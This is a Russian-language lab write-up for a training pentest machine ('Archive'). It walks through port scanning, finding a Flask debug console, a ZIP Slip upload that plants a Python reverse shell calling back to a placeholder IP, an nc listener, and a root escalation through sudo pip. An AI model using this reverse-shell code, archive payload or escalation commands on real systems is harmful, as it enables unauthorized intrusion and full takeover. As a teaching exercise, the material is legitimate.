# LifeTrainings - занятие от 20.10.2023

### Установка и локальный запуск

Для успешного запуска данной машины требуется установить [docker](https://habr.com/ru/articles/253877/) и выполнить следующую команду из данной директории:
```bash
docker compose up --build -d
```
В случае запуска на локальной машине - некоторые шаги по получению ReverseShell будут другими.
___

### Уязвимая машина Archive (pentest)
___
**Задача:** имея на входе только ip адрес сервиса получить полный доступ (права root) на уязвимой машине

**Решение:**

1. Этап сканирования: 
```bash
masscan -p1-65535 <ip> --rate=1000
```
>-p1-65535 - сканировать порты TCP от 1 до 65535
<ip> - айпи адрес уязвимой машины
--rate=1000 - количество пакетов посылаемое в секунду. При увеличении рейта увеличиться и скорость сканирования, но нектороые данные могут потеряться, т.к. сетевая карта/ширина канала не успеет/не позволит их обработать.

После сканирования известно о 3 открытых портах:
22 tcp - ssh хоста
4444 tcp - ssh проброшенный с контейнера
8080 tcp - web сервис

2. Изучение сайта на порту 8080:
 - Функционал сайта позволяет загружать zip архивы, при этом имеется проверка на валидность zip.
 - Можно просканировать директории через gobuster с каким либо словарем (на сервере под учеткой life доступные словари лежит в директории /wordlist), например как
 ```bash
gobuster -u http://<ip>:8080 -w /wordlist/dirb/common.txt -s "200,204,301,302,307,401,403,500"
```
>Ключ -u указывает на url для сканирования
Ключ -w указывает на словарь, по которому будут перебираться возможные пути и директории на сайте 
Ключ -s перечисляет на какие status code нужно смотреть. Тут необходимо добавить так же 500 ошибку, что бы увидеть возможные проблемные точки сайта.

После фаззинга находим два uri для данного сайта:
    - /console - по этому роуту откроется Flask Debug Console. Можем определить что сайт написан на Python с использованием фреймворка Flask. Позволяет выполнить произвольный код, но необходимо знать PIN-код.
    - /list вызывает ошибку в Debug Console. Позволяет определить что включен DEBUG режим, имеется возможность исполнение произвольного кода (необходимо знать PIN), есть раскрытие путей (можно определить пути ```/app/upload/``` и ```/app/main.py```).

3. Изучив все доступные функции можно сделать вывод, что для успешной аткаки на данный сайт нужно найти и проэксплуатировать уязвимость связанную с загрузкой архивов.
Запрос в гугл по типу ***web zip vulnerabilities*** одной из первых [ссылок](https://security.snyk.io/research/zip-slip-vulnerability) ведет на описание атаки **ZIP Slip**.
Данная атака позволяет перезаписать произвольный файл в системе (если мы знаем его путь).
Исходя из предыдущих пунктов нам известно, что:
- файлы загружаются в директорию ```/app/upload```
- доступный нам для перезаписи файл - ```main.py``` по в директории ```/app/main.py```

То есть, нам необходимо создать файл с именем ```../main.py``` и положить туда [ReverseShell](https://telegra.ph/Reverse-Shell-CHto-ehto-i-zachem-nuzhno-07-22).

4. Для генерации ReverseShell'a можно воспользоваться сервисом [revshells.com](https://www.revshells.com). Подставляем в ip адрес нашего внешнего сервера (с которого запускали сканы), в качестве порта указываем любой порт в диапазоне от 1000 до 65535 (все порты ниже 1000 требуют для запуска root прав), выбираем тип ***Python3 #2*** и копируем код в любой удобный нам редактор.

Далее необходимо привести код в примерно следующий вид:
```python
import socket,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("1.1.1.1",1337));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty; 
pty.spawn("sh")
```

Где вместо ```1.1.1.1``` и ```1337``` будут подставлены значения вашего ip и порта.
Теперь сохраняем этот код с любым именем на локальной системе.

5. Для генерации эксплоита можно воспользоваться готовым кодом, например взять [этот](https://github.com/cesarsotovalero/zip-slip-exploit-example.git).
- Клонируем репозиторий на локальную машину (должен быть установлен git):
```git clone https://github.com/cesarsotovalero/zip-slip-exploit-example.git```
- Заходим в директорию zip-slip-exploit-example:
```cd zip-slip-exploit-example```
- Запускаем файл evilarc.py (требуется установленный python2.7) со следующими параметрами:
```python2.7 evilarc.py --output-file team1.zip -d 1 -o unix main.py```
> --output-file имя создаваемого архива, можно указать любое
-d количество каталогов для обхода (т.е. количество добавляемых ../)
-o unix используемая платформа (win/unix)
main.py имя нашего файла с reverse-shell'ом

6. На сервере (с которого производили сканирование) запускаем listener, который будет ждать приема от нашего ReverseShell. Например так:
```nc -lvp 1337```
> ключ -l позволяет "слушать входящие соединения"
ключ -v включает verbose режим, что позволяет получать более детальную информацию
ключ -p указывает на необходимость "слушать" на порту 1337

На сервере так же установлен pwncat-cs и pwncat, для большего удобства. Так же можно все действия проводить через meterpreter.
7. Загружаем архив созданный на шаге 5 на сайт и жмем submit. Если все действия были проделаны верно, то на стороне listener после строки ```Listening on 0.0.0.0 1337``` должны появиться строки "Connection received on <address>" и "$", что означает что мы успешно получили reverse shell. Проверить можно вбив команду ```id``` и если видим ответ в виде ```uid=1000(appserver) gid=1000(appserver) groups=1000(appserver),27(sudo)``` значит все сделано верно.
8. Т.к. на данный момент мы сидим на сервере под обычной УЗ, а хочется подняться до уровня root (максимально привелегированная УЗ в системах *nix), то необходимо провести анализ на возможность локального повышения привелегий (Local Privilege Escalation или LPE):
- в ответе команды ```id``` можно заметить, что пользователь состоит сразу в нескольких группах - ```appserver``` и ```sudo```. То есть, если бы знали пароль от его УЗ, то могли бы выполнять любые действия от имени root-пользователя, но он нам не известен. 
- В некоторых случаях администраторы *nix систем оставляют возможность пользователям выполнять определенные команды от имени root без ввода пароля, с помощью редактирования файла [sudoers](https://ruvds.com/ru/helpcenter/znakomstvo-s-sudo/sudo-nastroika-faila-etc-sudoers/). Проверить доступно ли нам что-то из этого функционала можно командой ```sudo -l```
- В нашем случае мы можем выполнить команду ```sudo /usr/bin/pip install *``` без ввода пароля, что позволит нам запустить ее от имени пользователя root.
- Для поиска уязвимостей связанных с любыми бинарями в *nix системах есть прекрасный [сайт](https://gtfobins.github.io), где собранны все уловки в одном месте. Так же на сервере был установлен локальный пакет **gtfo**, позволяющий искать в терминале, например как ```gtfo -b pip```
- В нашем случае повышение привелегий сводиться к простому набору нескольких команд указанных в разделе **shell**:
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
- Проверяем удачность запусука через команду ```id``` и видим, что мы являемся root'ом в системе - то есть машина полностью под нашим контролем.

